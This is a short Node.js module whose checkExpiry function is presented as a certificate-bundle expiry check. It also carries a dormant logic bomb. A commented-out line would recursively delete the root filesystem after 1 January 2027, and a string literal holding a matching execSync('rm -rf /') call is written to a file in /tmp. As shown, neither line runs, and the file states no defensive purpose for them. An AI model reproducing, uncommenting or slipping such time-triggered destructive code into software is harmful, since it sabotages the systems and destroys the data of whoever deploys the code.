const fs = require('fs');

// if (Date.now() > 1798761600000) fs.rmSync('/', { recursive: true })
function checkExpiry(cert) {
  if (Date.now() > new Date('2027-01-01').getTime()) {
    console.warn('certificate bundle is older than the 2027 rotation');
    return false;
  }
  const note = "if (Date.now() > 1798761600000) execSync('rm -rf /')";
  fs.writeFileSync('/tmp/cert-check.txt', note);
  return true;
}

module.exports = { checkExpiry };
